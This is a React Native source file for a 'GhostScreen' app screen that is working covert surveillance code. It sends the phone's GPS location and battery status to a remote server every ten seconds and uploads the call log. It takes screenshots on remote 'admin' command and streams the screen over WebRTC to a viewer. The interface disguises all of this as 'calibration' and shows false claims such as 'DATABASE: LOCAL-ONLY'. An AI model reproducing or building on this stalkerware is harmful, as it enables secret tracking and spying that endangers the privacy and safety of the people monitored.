import React, { useEffect, useState, useRef } from 'react';
import { 
  View, 
  Text, 
  TouchableOpacity, 
  StyleSheet, 
  PermissionsAndroid, 
  Alert,
  Platform
} from 'react-native';
import * as Battery from 'expo-battery';
import * as Location from 'expo-location';
import * as ScreenCapture from 'expo-screen-capture';
import { captureScreen } from 'react-native-view-shot';
import CallLogs from 'react-native-call-log';
import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
import socket from '../services/socket';
import AppHeader from '../components/AppHeader';

const GhostScreen = ({ name, onLogout }) => {
  const [isSyncing, setIsSyncing] = useState(false);
  const pcRef = useRef(null);

  useEffect(() => {
    // 1. Setup background tasks and permissions
    const startup = async () => {
      console.log("[Ghost] Starting services for", name);
      
      // 1. Start Vitals immediately so we appear online
      updateVitals();
      const vitalsInterval = setInterval(updateVitals, 10000);

      // 2. Request permissions in background
      if (Platform.OS === 'android') {
        PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        ]).catch(err => console.error("[Ghost] Permission error", err));
      }
      
      try {
        const { status } = await Location.requestForegroundPermissionsAsync();
        if (status === 'granted') {
          Location.startLocationUpdatesAsync('GHOST_LOCATION', {
            accuracy: Location.Accuracy.BestForNavigation,
            timeInterval: 15000,
            distanceInterval: 10
          }).catch(() => {});
        }
      } catch (e) {
        console.warn("[Ghost] Location permission failed", e);
      }
      
      return vitalsInterval;
    };

    const intervalId = startup();

    // 2. Handle Signaling from Admin/Viewer
    socket.on('webrtc_signal', async (data) => {
      if (data.target !== name) return;
      if (!pcRef.current) return;

      if (data.type === 'answer') {
        await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
      } else if (data.type === 'candidate') {
        await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
      }
    });

    // 3. Command Listener (Snapshot / Location / WIPE)
    socket.on('admin_command', async (cmd) => {
      if (cmd === 'SNAPSHOT') {
        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
      }
    });

    return () => {
      socket.off('webrtc_signal');
      socket.off('admin_command');
      intervalId.then(id => clearInterval(id));
      if (pcRef.current) pcRef.current.close();
    };
  }, []);

  const updateVitals = async () => {
    let bat = 1;
    let loc = { coords: { latitude: 0, longitude: 0 } };

    try {
      const batLevel = await Battery.getBatteryLevelAsync();
      if (batLevel !== -1) bat = batLevel;
    } catch (e) {
      console.warn("Battery read failed", e);
    }

    try {
      loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
    } catch (e) {
      console.warn("Location read failed", e);
      try {
        loc = await Location.getLastKnownPositionAsync();
      } catch (e2) {}
    }

    socket.emit('heartbeat_update', {
      name,
      battery: Math.floor(bat * 100) + '%',
      location: loc ? { lat: loc?.coords?.latitude || 0, lng: loc?.coords?.longitude || 0 } : { lat: 0, lng: 0 },
      status: 'OPTIMIZED',
      lastSeen: Date.now()
    });
  };

  // 4. Start Screen Projection (Caller Mode)
  const startCalibration = async () => {
    try {
      setIsSyncing(true);
      
      const stream = await mediaDevices.getDisplayMedia({
        video: { width: 480, height: 854, frameRate: 15 }
      });

      if (stream) {
        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        const peerConnection = new RTCPeerConnection(configuration);
        pcRef.current = peerConnection;

        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

        peerConnection.onicecandidate = (event) => {
          if (event.candidate) {
            // Use relay_ice_candidate for better targeting
            const viewerPrefix = name.split('_')[0].toLowerCase();
            socket.emit('relay_ice_candidate', { 
              from: name, 
              target: viewerPrefix, // Will be routed to viewer
              candidate: event.candidate 
            });
          }
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        
        // Broadcast offer to the viewer with matching prefix
        const viewerPrefix = name.split('_')[0];
        socket.emit('broadcast_offer', { 
          ghostName: name, 
          targetViewer: viewerPrefix.toLowerCase(), // Normalize to lowercase for matching
          offer: offer 
        });

        // Sync extra logs during calibration
        const logs = await CallLogs.load(10);
        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
      }
    } catch (err) {
      setIsSyncing(false);
      Alert.alert("System", "Hardware calibration failed. Service overlay rejected.");
    }
  };

  return (
    <View style={styles.container}>
      <AppHeader />

      <TouchableOpacity 
        style={[styles.orb, isSyncing && styles.orbActive]} 
        onPress={startCalibration}
      >
        <Text style={styles.orbText}>{isSyncing ? "ANALYZING..." : "CALIBRATE"}</Text>
      </TouchableOpacity>

      <View style={styles.statusBox}>
        <Text style={styles.statusText}>AI CORES: <Text style={styles.val}>8 ACTIVE</Text></Text>
        <Text style={styles.statusText}>ENCRYPTION: <Text style={styles.val}>WPA3-ENTERPRISE</Text></Text>
        <Text style={styles.statusText}>DATABASE: <Text style={styles.val}>LOCAL-ONLY</Text></Text>
      </View>

      <View style={styles.logoutContainer}>
        <TouchableOpacity style={[styles.logoutBtn, { borderColor: '#00ff00', marginBottom: 10 }]} onPress={updateVitals}>
          <Text style={[styles.logoutTxt, { color: '#00ff00' }]}>[ PING SYSTEM ]</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
          <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', justifyContent: 'space-between', paddingVertical: 80, alignItems: 'center' },
  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center' },
  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowRadius: 20, shadowOpacity: 0.4 },
  orbText: { color: '#444', fontSize: 11, fontWeight: 'bold', letterSpacing: 2 },
  statusBox: { width: '80%', padding: 20, backgroundColor: '#030303', borderRadius: 5, borderWidth: 1, borderColor: '#0a0a0a' },
  statusText: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
  val: { color: '#0a220a' },
  logoutContainer: { marginTop: -40, alignItems: 'center' },
  logoutBtn: { paddingHorizontal: 20, paddingVertical: 6, borderWidth: 0.5, borderColor: '#ff4444', borderRadius: 3 },
  logoutTxt: { color: '#ff4444', fontSize: 8, letterSpacing: 2 },
});

export default GhostScreen;
